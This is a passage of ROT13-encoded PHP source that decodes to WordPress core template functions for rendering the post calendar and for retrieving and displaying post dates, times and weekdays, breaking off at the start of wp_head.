	$cnq = 7 - pnyraqne_jrrx_zbq( (vag) tzqngr( 'j', zxgvzr( 0, 0, 0, $guvfzbagu, $qnl, $guvflrne ) ) - $jrrx_ortvaf );
	vs ( 0 < $cnq && $cnq < 7 ) {
		$pnyraqne_bhgchg .= \"\a\g\g\" . '<gq pynff=\"cnq\" pbyfcna=\"' . rfp_ngge( $cnq ) . '\">&aofc;</gq>';
	}

	$pnyraqne_bhgchg .= \"\a\g</ge>\a\g</gobql>\";

	$pnyraqne_bhgchg .= \"\a\g</gnoyr>\";

	$pnyraqne_bhgchg .= '<ani nevn-ynory=\"' . __( 'Cerivbhf naq arkg zbaguf' ) . '\" pynff=\"jc-pnyraqne-ani\">';

	vs ( $cerivbhf ) {
		$pnyraqne_bhgchg .= \"\a\g\g\" . fcevags(
			'<fcna pynff=\"jc-pnyraqne-ani-ceri\"><n uers=\"%1$f\">&yndhb; %2$f</n></fcna>',
			trg_zbagu_yvax( $cerivbhf->lrne, $cerivbhf->zbagu ),
			$jc_ybpnyr->trg_zbagu_nooeri( $jc_ybpnyr->trg_zbagu( $cerivbhf->zbagu ) )
		);
	} ryfr {
		$pnyraqne_bhgchg .= \"\a\g\g\" . '<fcna pynff=\"jc-pnyraqne-ani-ceri\">&aofc;</fcna>';
	}

	$pnyraqne_bhgchg .= \"\a\g\g\" . '<fcna pynff=\"cnq\">&aofc;</fcna>';

	vs ( $arkg ) {
		$pnyraqne_bhgchg .= \"\a\g\g\" . fcevags(
			'<fcna pynff=\"jc-pnyraqne-ani-arkg\"><n uers=\"%1$f\">%2$f &endhb;</n></fcna>',
			trg_zbagu_yvax( $arkg->lrne, $arkg->zbagu ),
			$jc_ybpnyr->trg_zbagu_nooeri( $jc_ybpnyr->trg_zbagu( $arkg->zbagu ) )
		);
	} ryfr {
		$pnyraqne_bhgchg .= \"\a\g\g\" . '<fcna pynff=\"jc-pnyraqne-ani-arkg\">&aofc;</fcna>';
	}

	$pnyraqne_bhgchg .= '
	</ani>';

	$pnpur[ $xrl ] = $pnyraqne_bhgchg;
	jc_pnpur_frg( 'trg_pnyraqne', $pnpur, 'pnyraqne' );

	/**
	 * Svygref gur UGZY pnyraqne bhgchg.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 6.8.0 Nqqrq gur `$netf` cnenzrgre.
	 *
	 * @cnenz fgevat $pnyraqne_bhgchg UGZY bhgchg bs gur pnyraqne.
	 * @cnenz neenl  $netf {
	 *     Bcgvbany. Neenl bs qvfcynl nethzragf.
	 *
	 *     @glcr obby   $vavgvny   Jurgure gb hfr vavgvny pnyraqne anzrf. Qrsnhyg gehr.
	 *     @glcr obby   $qvfcynl   Jurgure gb qvfcynl gur pnyraqne bhgchg. Qrsnhyg gehr.
	 *     @glcr fgevat $cbfg_glcr Bcgvbany. Cbfg glcr. Qrsnhyg 'cbfg'.
	 * }
	 */
	$pnyraqne_bhgchg = nccyl_svygref( 'trg_pnyraqne', $pnyraqne_bhgchg, $netf );

	vs ( $netf['qvfcynl'] ) {
		rpub $pnyraqne_bhgchg;
		erghea;
	}

	erghea $pnyraqne_bhgchg;
}

/**
 * Chetrf gur pnpurq erfhygf bs trg_pnyraqne.
 *
 * @frr trg_pnyraqne()
 * @fvapr 2.1.0
 */
shapgvba qryrgr_trg_pnyraqne_pnpur() {
	jc_pnpur_qryrgr( 'trg_pnyraqne', 'pnyraqne' );
}

/**
 * Qvfcynlf nyy bs gur nyybjrq gntf va UGZY sbezng jvgu nggevohgrf.
 *
 * Guvf vf hfrshy sbe qvfcynlvat va gur pbzzrag nern, juvpu ryrzragf naq
 * nggevohgrf ner fhccbegrq. Nf jryy nf nal cyhtvaf juvpu jnag gb qvfcynl vg.
 *
 * @fvapr 1.0.1
 * @fvapr 4.4.0 Ab ybatre hfrq va pber.
 *
 * @tybony neenl $nyybjrqgntf
 *
 * @erghea fgevat UGZY nyybjrq gntf ragvgl rapbqrq.
 */
shapgvba nyybjrq_gntf() {
	tybony $nyybjrqgntf;
	$nyybjrq = '';
	sbernpu ( (neenl) $nyybjrqgntf nf $gnt => $nggevohgrf ) {
		$nyybjrq .= '<' . $gnt;
		vs ( 0 < pbhag( $nggevohgrf ) ) {
			sbernpu ( $nggevohgrf nf $nggevohgr => $yvzvgf ) {
				$nyybjrq .= ' ' . $nggevohgr . '=\"\"';
			}
		}
		$nyybjrq .= '> ';
	}
	erghea ugzyragvgvrf( $nyybjrq );
}

/***** Qngr/Gvzr gntf */

/**
 * Bhgchgf gur qngr va vfb8601 sbezng sbe kzy svyrf.
 *
 * @fvapr 1.0.0
 */
shapgvba gur_qngr_kzy() {
	rpub zlfdy2qngr( 'L-z-q', trg_cbfg()->cbfg_qngr, snyfr );
}

/**
 * Qvfcynlf be ergevrirf gur qngr bs gur cbfg (bapr cre qngr).
 *
 * Jvyy bayl bhgchg gur qngr vs gur pheerag cbfg'f qngr vf qvssrerag sebz gur
 * cerivbhf bar bhgchg.
 *
 * v.r. Bayl bar qngr yvfgvat jvyy fubj cre qnl jbegu bs cbfgf fubja va gur ybbc, rira vs gur
 * shapgvba vf pnyyrq frireny gvzrf sbe rnpu cbfg.
 *
 * UGZY bhgchg pna or svygrerq jvgu {@frr 'gur_qngr'}.
 * Qngr fgevat bhgchg pna or svygrerq jvgu {@frr 'trg_gur_qngr'}.
 *
 * @fvapr 0.71
 *
 * @tybony fgevat $pheeragqnl  Gur qnl bs gur pheerag cbfg va gur ybbc.
 * @tybony fgevat $cerivbhfqnl Gur qnl bs gur cerivbhf cbfg va gur ybbc.
 *
 * @cnenz fgevat $sbezng  Bcgvbany. CUC qngr sbezng. Qrsnhygf gb gur 'qngr_sbezng' bcgvba.
 * @cnenz fgevat $orsber  Bcgvbany. Bhgchg orsber gur qngr. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre   Bcgvbany. Bhgchg nsgre gur qngr. Qrsnhyg rzcgl.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb rpub gur qngr be erghea vg. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Fgevat vs ergevrivat.
 */
shapgvba gur_qngr( $sbezng = '', $orsber = '', $nsgre = '', $qvfcynl = gehr ) {
	tybony $pheeragqnl, $cerivbhfqnl;

	$gur_qngr = '';

	vs ( vf_arj_qnl() ) {
		$gur_qngr    = $orsber . trg_gur_qngr( $sbezng ) . $nsgre;
		$cerivbhfqnl = $pheeragqnl;
	}

	/**
	 * Svygref gur qngr bs gur cbfg, sbe qvfcynl.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz fgevat $gur_qngr Gur sbeznggrq qngr fgevat.
	 * @cnenz fgevat $sbezng   CUC qngr sbezng.
	 * @cnenz fgevat $orsber   UGZY bhgchg orsber gur qngr.
	 * @cnenz fgevat $nsgre    UGZY bhgchg nsgre gur qngr.
	 */
	$gur_qngr = nccyl_svygref( 'gur_qngr', $gur_qngr, $sbezng, $orsber, $nsgre );

	vs ( $qvfcynl ) {
		rpub $gur_qngr;
	} ryfr {
		erghea $gur_qngr;
	}
}

/**
 * Ergevrirf gur qngr bs gur cbfg.
 *
 * Hayvxr gur_qngr() guvf shapgvba jvyy nyjnlf erghea gur qngr.
 * Zbqvsl bhgchg jvgu gur {@frr 'trg_gur_qngr'} svygre.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat      $sbezng Bcgvbany. CUC qngr sbezng. Qrsnhygf gb gur 'qngr_sbezng' bcgvba.
 * @cnenz vag|JC_Cbfg $cbfg   Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg pheerag cbfg.
 * @erghea fgevat|vag|snyfr Qngr gur pheerag cbfg jnf jevggra. Snyfr ba snvyher.
 */
shapgvba trg_gur_qngr( $sbezng = '', $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$_sbezng = ! rzcgl( $sbezng ) ? $sbezng : trg_bcgvba( 'qngr_sbezng' );

	$gur_qngr = trg_cbfg_gvzr( $_sbezng, snyfr, $cbfg, gehr );

	/**
	 * Svygref gur qngr bs gur cbfg.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat|vag $gur_qngr Sbeznggrq qngr fgevat be Havk gvzrfgnzc vs `$sbezng` vf 'H' be 'T'.
	 * @cnenz fgevat     $sbezng   CUC qngr sbezng.
	 * @cnenz JC_Cbfg    $cbfg     Gur cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'trg_gur_qngr', $gur_qngr, $sbezng, $cbfg );
}

/**
 * Qvfcynlf gur qngr ba juvpu gur cbfg jnf ynfg zbqvsvrq.
 *
 * @fvapr 2.1.0
 *
 * @cnenz fgevat $sbezng  Bcgvbany. CUC qngr sbezng. Qrsnhygf gb gur 'qngr_sbezng' bcgvba.
 * @cnenz fgevat $orsber  Bcgvbany. Bhgchg orsber gur qngr. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre   Bcgvbany. Bhgchg nsgre gur qngr. Qrsnhyg rzcgl.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb rpub gur qngr be erghea vg. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Fgevat vs ergevrivat.
 */
shapgvba gur_zbqvsvrq_qngr( $sbezng = '', $orsber = '', $nsgre = '', $qvfcynl = gehr ) {
	$gur_zbqvsvrq_qngr = $orsber . trg_gur_zbqvsvrq_qngr( $sbezng ) . $nsgre;

	/**
	 * Svygref gur qngr n cbfg jnf ynfg zbqvsvrq, sbe qvfcynl.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $gur_zbqvsvrq_qngr Gur ynfg zbqvsvrq qngr.
	 * @cnenz fgevat $sbezng            CUC qngr sbezng.
	 * @cnenz fgevat $orsber            UGZY bhgchg orsber gur qngr.
	 * @cnenz fgevat $nsgre             UGZY bhgchg nsgre gur qngr.
	 */
	$gur_zbqvsvrq_qngr = nccyl_svygref( 'gur_zbqvsvrq_qngr', $gur_zbqvsvrq_qngr, $sbezng, $orsber, $nsgre );

	vs ( $qvfcynl ) {
		rpub $gur_zbqvsvrq_qngr;
	} ryfr {
		erghea $gur_zbqvsvrq_qngr;
	}
}

/**
 * Ergevrirf gur qngr ba juvpu gur cbfg jnf ynfg zbqvsvrq.
 *
 * @fvapr 2.1.0
 * @fvapr 4.6.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz fgevat      $sbezng Bcgvbany. CUC qngr sbezng. Qrsnhygf gb gur 'qngr_sbezng' bcgvba.
 * @cnenz vag|JC_Cbfg $cbfg   Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg pheerag cbfg.
 * @erghea fgevat|vag|snyfr Qngr gur pheerag cbfg jnf zbqvsvrq. Snyfr ba snvyher.
 */
shapgvba trg_gur_zbqvsvrq_qngr( $sbezng = '', $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		// Sbe onpxjneq pbzcngvovyvgl, snvyherf tb guebhtu gur svygre orybj.
		$gur_gvzr = snyfr;
	} ryfr {
		$_sbezng = ! rzcgl( $sbezng ) ? $sbezng : trg_bcgvba( 'qngr_sbezng' );

		$gur_gvzr = trg_cbfg_zbqvsvrq_gvzr( $_sbezng, snyfr, $cbfg, gehr );
	}

	/**
	 * Svygref gur qngr n cbfg jnf ynfg zbqvsvrq.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 4.6.0 Nqqrq gur `$cbfg` cnenzrgre.
	 *
	 * @cnenz fgevat|vag|snyfr $gur_gvzr Gur sbeznggrq qngr be snyfr vs ab cbfg vf sbhaq.
	 * @cnenz fgevat           $sbezng   CUC qngr sbezng.
	 * @cnenz JC_Cbfg|ahyy     $cbfg     JC_Cbfg bowrpg be ahyy vs ab cbfg vf sbhaq.
	 */
	erghea nccyl_svygref( 'trg_gur_zbqvsvrq_qngr', $gur_gvzr, $sbezng, $cbfg );
}

/**
 * Qvfcynlf gur gvzr bs gur cbfg.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $sbezng Bcgvbany. Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
 *                       jnf jevggra. Npprcgf 'T', 'H', be CUC qngr sbezng.
 *                       Qrsnhygf gb gur 'gvzr_sbezng' bcgvba.
 */
shapgvba gur_gvzr( $sbezng = '' ) {
	/**
	 * Svygref gur gvzr bs gur cbfg, sbe qvfcynl.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz fgevat $trg_gur_gvzr Gur sbeznggrq gvzr.
	 * @cnenz fgevat $sbezng       Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
	 *                             jnf jevggra. Npprcgf 'T', 'H', be CUC qngr sbezng.
	 */
	rpub nccyl_svygref( 'gur_gvzr', trg_gur_gvzr( $sbezng ), $sbezng );
}

/**
 * Ergevrirf gur gvzr bs gur cbfg.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat      $sbezng Bcgvbany. Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
 *                            jnf jevggra. Npprcgf 'T', 'H', be CUC qngr sbezng.
 *                            Qrsnhygf gb gur 'gvzr_sbezng' bcgvba.
 * @cnenz vag|JC_Cbfg $cbfg   Cbfg VQ be cbfg bowrpg. Qrsnhyg vf tybony `$cbfg` bowrpg.
 * @erghea fgevat|vag|snyfr Sbeznggrq qngr fgevat be Havk gvzrfgnzc vs `$sbezng` vf 'H' be 'T'.
 *                          Snyfr ba snvyher.
 */
shapgvba trg_gur_gvzr( $sbezng = '', $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$_sbezng = ! rzcgl( $sbezng ) ? $sbezng : trg_bcgvba( 'gvzr_sbezng' );

	$gur_gvzr = trg_cbfg_gvzr( $_sbezng, snyfr, $cbfg, gehr );

	/**
	 * Svygref gur gvzr bs gur cbfg.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat|vag $gur_gvzr Sbeznggrq qngr fgevat be Havk gvzrfgnzc vs `$sbezng` vf 'H' be 'T'.
	 * @cnenz fgevat     $sbezng   Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
	 *                             jnf jevggra. Npprcgf 'T', 'H', be CUC qngr sbezng.
	 * @cnenz JC_Cbfg    $cbfg     Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'trg_gur_gvzr', $gur_gvzr, $sbezng, $cbfg );
}

/**
 * Ergevrirf gur ybpnyvmrq gvzr bs gur cbfg.
 *
 * @fvapr 2.0.0
 *
 * @cnenz fgevat      $sbezng    Bcgvbany. Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
 *                               jnf jevggra. Npprcgf 'T', 'H', be CUC qngr sbezng. Qrsnhyg 'H'.
 * @cnenz obby        $tzg       Bcgvbany. Jurgure gb ergevrir gur TZG gvzr. Qrsnhyg snyfr.
 * @cnenz vag|JC_Cbfg $cbfg      Cbfg VQ be cbfg bowrpg. Qrsnhyg vf tybony `$cbfg` bowrpg.
 * @cnenz obby        $genafyngr Jurgure gb genafyngr gur gvzr fgevat. Qrsnhyg snyfr.
 * @erghea fgevat|vag|snyfr Sbeznggrq qngr fgevat be Havk gvzrfgnzc vs `$sbezng` vf 'H' be 'T'.
 *                          Snyfr ba snvyher.
 */
shapgvba trg_cbfg_gvzr( $sbezng = 'H', $tzg = snyfr, $cbfg = ahyy, $genafyngr = snyfr ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$fbhepr   = ( $tzg ) ? 'tzg' : 'ybpny';
	$qngrgvzr = trg_cbfg_qngrgvzr( $cbfg, 'qngr', $fbhepr );

	vs ( snyfr === $qngrgvzr ) {
		erghea snyfr;
	}

	vs ( 'H' === $sbezng || 'T' === $sbezng ) {
		$gvzr = $qngrgvzr->trgGvzrfgnzc();

		// Ergheaf n fhz bs gvzrfgnzc jvgu gvzrmbar bssfrg. Vqrnyyl fubhyq arire or hfrq.
		vs ( ! $tzg ) {
			$gvzr += $qngrgvzr->trgBssfrg();
		}
	} ryfrvs ( $genafyngr ) {
		$gvzr = jc_qngr( $sbezng, $qngrgvzr->trgGvzrfgnzc(), $tzg ? arj QngrGvzrMbar( 'HGP' ) : ahyy );
	} ryfr {
		vs ( $tzg ) {
			$qngrgvzr = $qngrgvzr->frgGvzrmbar( arj QngrGvzrMbar( 'HGP' ) );
		}

		$gvzr = $qngrgvzr->sbezng( $sbezng );
	}

	/**
	 * Svygref gur ybpnyvmrq gvzr bs gur cbfg.
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz fgevat|vag $gvzr   Sbeznggrq qngr fgevat be Havk gvzrfgnzc vs `$sbezng` vf 'H' be 'T'.
	 * @cnenz fgevat     $sbezng Sbezng gb hfr sbe ergevrivat gur qngr bs gur cbfg.
	 *                           Npprcgf 'T', 'H', be CUC qngr sbezng.
	 * @cnenz obby       $tzg    Jurgure gb ergevrir gur TZG gvzr.
	 */
	erghea nccyl_svygref( 'trg_cbfg_gvzr', $gvzr, $sbezng, $tzg );
}

/**
 * Ergevrirf cbfg choyvfurq be zbqvsvrq gvzr nf n `QngrGvzrVzzhgnoyr` bowrpg vafgnapr.
 *
 * Gur bowrpg jvyy or frg gb gur gvzrmbar sebz JbeqCerff frggvatf.
 *
 * Sbe yrtnpl ernfbaf, guvf shapgvba nyybjf gb pubbfr gb vafgnagvngr sebz ybpny be HGP gvzr va qngnonfr.
 * Abeznyyl guvf fubhyq znxr ab qvssrerapr gb gur erfhyg. Ubjrire, gur inyhrf zvtug trg bhg bs flap va qngnonfr,
 * glcvpnyyl orpnhfr bs gvzrmbar frggvat punatrf. Gur cnenzrgre rafherf gur novyvgl gb ercebqhpr onpxjneqf
 * pbzcngvoyr orunivbef va fhpu pnfrf.
 *
 * @fvapr 5.3.0
 *
 * @cnenz vag|JC_Cbfg $cbfg   Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf tybony `$cbfg` bowrpg.
 * @cnenz fgevat      $svryq  Bcgvbany. Choyvfurq be zbqvsvrq gvzr gb hfr sebz qngnonfr. Npprcgf 'qngr' be 'zbqvsvrq'.
 *                            Qrsnhyg 'qngr'.
 * @cnenz fgevat      $fbhepr Bcgvbany. Ybpny be HGP gvzr gb hfr sebz qngnonfr. Npprcgf 'ybpny' be 'tzg'.
 *                            Qrsnhyg 'ybpny'.
 * @erghea QngrGvzrVzzhgnoyr|snyfr Gvzr bowrpg ba fhpprff, snyfr ba snvyher.
 */
shapgvba trg_cbfg_qngrgvzr( $cbfg = ahyy, $svryq = 'qngr', $fbhepr = 'ybpny' ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$jc_gvzrmbar = jc_gvzrmbar();

	vs ( 'tzg' === $fbhepr ) {
		$gvzr     = ( 'zbqvsvrq' === $svryq ) ? $cbfg->cbfg_zbqvsvrq_tzg : $cbfg->cbfg_qngr_tzg;
		$gvzrmbar = arj QngrGvzrMbar( 'HGP' );
	} ryfr {
		$gvzr     = ( 'zbqvsvrq' === $svryq ) ? $cbfg->cbfg_zbqvsvrq : $cbfg->cbfg_qngr;
		$gvzrmbar = $jc_gvzrmbar;
	}

	vs ( rzcgl( $gvzr ) || '0000-00-00 00:00:00' === $gvzr ) {
		erghea snyfr;
	}

	$qngrgvzr = qngr_perngr_vzzhgnoyr_sebz_sbezng( 'L-z-q U:v:f', $gvzr, $gvzrmbar );

	vs ( snyfr === $qngrgvzr ) {
		erghea snyfr;
	}

	erghea $qngrgvzr->frgGvzrmbar( $jc_gvzrmbar );
}

/**
 * Ergevrirf cbfg choyvfurq be zbqvsvrq gvzr nf n Havk gvzrfgnzc.
 *
 * Abgr gung guvf shapgvba ergheaf n gehr Havk gvzrfgnzc, abg fhzzrq jvgu gvzrmbar bssfrg
 * yvxr byqre JC shapgvbaf.
 *
 * @fvapr 5.3.0
 *
 * @cnenz vag|JC_Cbfg $cbfg  Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf tybony `$cbfg` bowrpg.
 * @cnenz fgevat      $svryq Bcgvbany. Choyvfurq be zbqvsvrq gvzr gb hfr sebz qngnonfr. Npprcgf 'qngr' be 'zbqvsvrq'.
 *                           Qrsnhyg 'qngr'.
 * @erghea vag|snyfr Havk gvzrfgnzc ba fhpprff, snyfr ba snvyher.
 */
shapgvba trg_cbfg_gvzrfgnzc( $cbfg = ahyy, $svryq = 'qngr' ) {
	$qngrgvzr = trg_cbfg_qngrgvzr( $cbfg, $svryq );

	vs ( snyfr === $qngrgvzr ) {
		erghea snyfr;
	}

	erghea $qngrgvzr->trgGvzrfgnzc();
}

/**
 * Qvfcynlf gur gvzr ng juvpu gur cbfg jnf ynfg zbqvsvrq.
 *
 * @fvapr 2.0.0
 *
 * @cnenz fgevat $sbezng Bcgvbany. Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
 *                       jnf zbqvsvrq. Npprcgf 'T', 'H', be CUC qngr sbezng.
 *                       Qrsnhygf gb gur 'gvzr_sbezng' bcgvba.
 */
shapgvba gur_zbqvsvrq_gvzr( $sbezng = '' ) {
	/**
	 * Svygref gur ybpnyvmrq gvzr n cbfg jnf ynfg zbqvsvrq, sbe qvfcynl.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat|snyfr $trg_gur_zbqvsvrq_gvzr Gur sbeznggrq gvzr be snyfr vs ab cbfg vf sbhaq.
	 * @cnenz fgevat       $sbezng                Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
	 *                                            jnf zbqvsvrq. Npprcgf 'T', 'H', be CUC qngr sbezng.
	 */
	rpub nccyl_svygref( 'gur_zbqvsvrq_gvzr', trg_gur_zbqvsvrq_gvzr( $sbezng ), $sbezng );
}

/**
 * Ergevrirf gur gvzr ng juvpu gur cbfg jnf ynfg zbqvsvrq.
 *
 * @fvapr 2.0.0
 * @fvapr 4.6.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz fgevat      $sbezng Bcgvbany. Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
 *                            jnf zbqvsvrq. Npprcgf 'T', 'H', be CUC qngr sbezng.
 *                            Qrsnhygf gb gur 'gvzr_sbezng' bcgvba.
 * @cnenz vag|JC_Cbfg $cbfg   Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg pheerag cbfg.
 * @erghea fgevat|vag|snyfr Sbeznggrq qngr fgevat be Havk gvzrfgnzc. Snyfr ba snvyher.
 */
shapgvba trg_gur_zbqvsvrq_gvzr( $sbezng = '', $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		// Sbe onpxjneq pbzcngvovyvgl, snvyherf tb guebhtu gur svygre orybj.
		$gur_gvzr = snyfr;
	} ryfr {
		$_sbezng = ! rzcgl( $sbezng ) ? $sbezng : trg_bcgvba( 'gvzr_sbezng' );

		$gur_gvzr = trg_cbfg_zbqvsvrq_gvzr( $_sbezng, snyfr, $cbfg, gehr );
	}

	/**
	 * Svygref gur ybpnyvmrq gvzr n cbfg jnf ynfg zbqvsvrq.
	 *
	 * @fvapr 2.0.0
	 * @fvapr 4.6.0 Nqqrq gur `$cbfg` cnenzrgre.
	 *
	 * @cnenz fgevat|vag|snyfr $gur_gvzr Gur sbeznggrq gvzr be snyfr vs ab cbfg vf sbhaq.
	 * @cnenz fgevat           $sbezng   Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
	 *                                   jnf zbqvsvrq. Npprcgf 'T', 'H', be CUC qngr sbezng.
	 * @cnenz JC_Cbfg|ahyy     $cbfg     JC_Cbfg bowrpg be ahyy vs ab cbfg vf sbhaq.
	 */
	erghea nccyl_svygref( 'trg_gur_zbqvsvrq_gvzr', $gur_gvzr, $sbezng, $cbfg );
}

/**
 * Ergevrirf gur gvzr ng juvpu gur cbfg jnf ynfg zbqvsvrq.
 *
 * @fvapr 2.0.0
 *
 * @cnenz fgevat      $sbezng    Bcgvbany. Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg
 *                               jnf zbqvsvrq. Npprcgf 'T', 'H', be CUC qngr sbezng. Qrsnhyg 'H'.
 * @cnenz obby        $tzg       Bcgvbany. Jurgure gb ergevrir gur TZG gvzr. Qrsnhyg snyfr.
 * @cnenz vag|JC_Cbfg $cbfg      Cbfg VQ be cbfg bowrpg. Qrsnhyg vf tybony `$cbfg` bowrpg.
 * @cnenz obby        $genafyngr Jurgure gb genafyngr gur gvzr fgevat. Qrsnhyg snyfr.
 * @erghea fgevat|vag|snyfr Sbeznggrq qngr fgevat be Havk gvzrfgnzc vs `$sbezng` vf 'H' be 'T'.
 *                          Snyfr ba snvyher.
 */
shapgvba trg_cbfg_zbqvsvrq_gvzr( $sbezng = 'H', $tzg = snyfr, $cbfg = ahyy, $genafyngr = snyfr ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$fbhepr   = ( $tzg ) ? 'tzg' : 'ybpny';
	$qngrgvzr = trg_cbfg_qngrgvzr( $cbfg, 'zbqvsvrq', $fbhepr );

	vs ( snyfr === $qngrgvzr ) {
		erghea snyfr;
	}

	vs ( 'H' === $sbezng || 'T' === $sbezng ) {
		$gvzr = $qngrgvzr->trgGvzrfgnzc();

		// Ergheaf n fhz bs gvzrfgnzc jvgu gvzrmbar bssfrg. Vqrnyyl fubhyq arire or hfrq.
		vs ( ! $tzg ) {
			$gvzr += $qngrgvzr->trgBssfrg();
		}
	} ryfrvs ( $genafyngr ) {
		$gvzr = jc_qngr( $sbezng, $qngrgvzr->trgGvzrfgnzc(), $tzg ? arj QngrGvzrMbar( 'HGP' ) : ahyy );
	} ryfr {
		vs ( $tzg ) {
			$qngrgvzr = $qngrgvzr->frgGvzrmbar( arj QngrGvzrMbar( 'HGP' ) );
		}

		$gvzr = $qngrgvzr->sbezng( $sbezng );
	}

	/**
	 * Svygref gur ybpnyvmrq gvzr n cbfg jnf ynfg zbqvsvrq.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat|vag $gvzr   Sbeznggrq qngr fgevat be Havk gvzrfgnzc vs `$sbezng` vf 'H' be 'T'.
	 * @cnenz fgevat     $sbezng Sbezng gb hfr sbe ergevrivat gur gvzr gur cbfg jnf zbqvsvrq.
	 *                           Npprcgf 'T', 'H', be CUC qngr sbezng. Qrsnhyg 'H'.
	 * @cnenz obby       $tzg    Jurgure gb ergevrir gur TZG gvzr. Qrsnhyg snyfr.
	 */
	erghea nccyl_svygref( 'trg_cbfg_zbqvsvrq_gvzr', $gvzr, $sbezng, $tzg );
}

/**
 * Qvfcynlf gur ybpnyvmrq jrrxqnl sbe gur cbfg.
 *
 * @fvapr 0.71
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 */
shapgvba gur_jrrxqnl() {
	tybony $jc_ybpnyr;

	$cbfg = trg_cbfg();

	vs ( ! $cbfg ) {
		erghea;
	}

	$gur_jrrxqnl = $jc_ybpnyr->trg_jrrxqnl( trg_cbfg_gvzr( 'j', snyfr, $cbfg ) );

	/**
	 * Svygref gur ybpnyvmrq jrrxqnl bs gur cbfg, sbe qvfcynl.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz fgevat $gur_jrrxqnl
	 */
	rpub nccyl_svygref( 'gur_jrrxqnl', $gur_jrrxqnl );
}

/**
 * Qvfcynlf gur ybpnyvmrq jrrxqnl sbe gur cbfg.
 *
 * Jvyy bayl bhgchg gur jrrxqnl vs gur pheerag cbfg'f jrrxqnl vf qvssrerag sebz
 * gur cerivbhf bar bhgchg.
 *
 * @fvapr 0.71
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr       JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 * @tybony fgevat    $pheeragqnl      Gur qnl bs gur pheerag cbfg va gur ybbc.
 * @tybony fgevat    $cerivbhfjrrxqnl Gur qnl bs gur cerivbhf cbfg va gur ybbc.
 *
 * @cnenz fgevat $orsber Bcgvbany. Bhgchg orsber gur qngr. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre  Bcgvbany. Bhgchg nsgre gur qngr. Qrsnhyg rzcgl.
 */
shapgvba gur_jrrxqnl_qngr( $orsber = '', $nsgre = '' ) {
	tybony $jc_ybpnyr, $pheeragqnl, $cerivbhfjrrxqnl;

	$cbfg = trg_cbfg();

	vs ( ! $cbfg ) {
		erghea;
	}

	$gur_jrrxqnl_qngr = '';

	vs ( $pheeragqnl !== $cerivbhfjrrxqnl ) {
		$gur_jrrxqnl_qngr .= $orsber;
		$gur_jrrxqnl_qngr .= $jc_ybpnyr->trg_jrrxqnl( trg_cbfg_gvzr( 'j', snyfr, $cbfg ) );
		$gur_jrrxqnl_qngr .= $nsgre;
		$cerivbhfjrrxqnl   = $pheeragqnl;
	}

	/**
	 * Svygref gur ybpnyvmrq jrrxqnl bs gur cbfg, sbe qvfcynl.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz fgevat $gur_jrrxqnl_qngr Gur jrrxqnl ba juvpu gur cbfg jnf jevggra.
	 * @cnenz fgevat $orsber           Gur UGZY gb bhgchg orsber gur qngr.
	 * @cnenz fgevat $nsgre            Gur UGZY gb bhgchg nsgre gur qngr.
	 */
	rpub nccyl_svygref( 'gur_jrrxqnl_qngr', $gur_jrrxqnl_qngr, $orsber, $nsgre );
}

/**
 * Sverf gur jc_urnq npgvba.
 *
 * Frr {@frr 'jc_urnq'}.
 *
 * @fvapr 1.2.0
 */
shapgvba jc_urnq() {
	/**
